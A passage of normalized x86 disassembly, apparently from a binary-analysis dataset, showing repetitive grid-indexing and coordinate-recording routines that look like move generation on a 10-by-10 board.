lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + ecx * 4 - 0x2c ] 0x20
jne r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x8 ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ rw-data ]
mov ecx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + ecx * 4 - 0x2c ] 0x20
jne r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x8 ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
mov ecx [ rw-data ]
dec ecx
mov [ rw-data ] edx
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
cmp edx 0x1
jl r-xdata
cmp edx 0xa
jg r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
lea ecx [ eax + ecx * 4 ]
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 - 0x1 ]
add ecx edx
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
mov ecx [ rw-data ]
dec ecx
mov [ rw-data ] edx
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
cmp edx 0x1
jl r-xdata
cmp edx 0xa
jg r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
lea ecx [ eax + ecx * 4 ]
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 - 0x1 ]
add ecx edx
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ rw-data ]
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
add ecx edi
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ ebp - 0x8 ]
inc edi
add ecx 0x4
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0xa
jle r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
add ecx edi
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ ebp - 0x8 ]
inc edi
add ecx 0x4
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0xa
jle r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
test edx edx
jne r-xdata
test edx edx
jne r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
add ecx edi
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov edx 0x1
mov [ rw-data ] edx
inc edi
add ecx 0x4
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0xa
jle r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
jmp r-xdata
test edx edx
jne r-xdata
test edx edx
jne r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
add ecx edi
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov edx 0x1
mov [ rw-data ] edx
inc edi
add ecx 0x4
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0xa
jle r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
dec edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
mov ecx [ ebp - 0xc ]
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
dec edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
mov ecx [ ebp - 0xc ]
mov edx [ rw-data ]
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] 0x0
mov ecx [ eax ]
mov edx [ rw-data ]
dec edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] 0x10
mov ecx [ eax ]
mov edx [ rw-data ]
dec edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x8 ]
mov [ esi + ecx * 8 + 0x4 ] edx
mov ecx [ ebp - 0xc ]
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ esi + ecx * 8 + 0x4 ] edx
mov ecx [ ebp - 0xc ]
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + ecx * 4 - 0x34 ] 0x20
jne r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + ecx * 4 - 0x34 ] 0x20
jne r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
cmp edx 0x1
jl r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
lea ecx [ eax + ecx * 4 ]
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
inc edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
mov edx [ rw-data ]
cmp edx 0x1
jl r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
lea ecx [ eax + ecx * 4 ]
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
inc edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
mov edx [ rw-data ]
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
jmp r-xdata
mov ecx [ ebp - 0x8 ]
dec edi
sub ecx 0x4
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0x1
jge r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
jmp r-xdata
mov ecx [ ebp - 0x8 ]
dec edi
sub ecx 0x4
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0x1
jge r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
add ecx edi
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov edx 0x1
mov [ rw-data ] edx
dec edi
sub ecx 0x4
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0x1
jge r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
add ecx edi
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov edx 0x1
mov [ rw-data ] edx
dec edi
sub ecx 0x4
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0x1
jge r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov edi [ ebp + 0x10 ]
inc [ eax ]
xor edx edx
cmp [ edi ] edx
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x8 ]
mov [ esi + ecx * 8 + 0x4 ] edx
mov ecx [ ebp - 0xc ]
jmp r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x8 ]
mov [ esi + ecx * 8 + 0x4 ] edx
mov ecx [ ebp - 0xc ]
jmp r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
inc edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
dec edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
mov edx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
inc edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
dec edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
mov edx [ rw-data ]
mov ecx [ ecx ]
sete dl
cmp ecx [ edx * 4 + r--data ]
je r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
jmp r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
jmp r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
dec edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
mov ecx [ ebp - 0xc ]
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
dec edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
mov ecx [ ebp - 0xc ]
jmp r-xdata
mov edx [ rw-data ]
sub_40b850
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push 0x1000
push 0x0
push rw-data
call sub_40dea0
push 0x80
push 0x0
push rw-data
call sub_40dea0
push 0x80
push 0x0
push rw-data
call sub_40dea0
push 0x80
push 0x0
push rw-data
call sub_40dea0
push 0x80
push 0x0
push rw-data
call sub_40dea0
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
push rw-data
push rw-data
push esi
push ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
call sub_4077e0
mov ecx [ esi ]
add esp 0x50
mov edx [ ecx * 4 + r--data ]
mov esi [ ecx * 4 + r--data ]
cmp edx esi
jg r-xdata
push edi
mov edi ebx
xor esi esi
nop [ eax + eax ] ax
xor eax eax
test ecx ecx
mov ecx edx
sete al
shl ecx 0x5
mov eax [ eax * 4 + r--data ]
add eax ecx
lea eax [ eax * 4 + rw-data ]
add esi 0x4
add edi 0x8
cmp esi 0x80
jl r-xdata
mov eax [ esi + r--data ]
lea ecx [ eax + eax * 2 ]
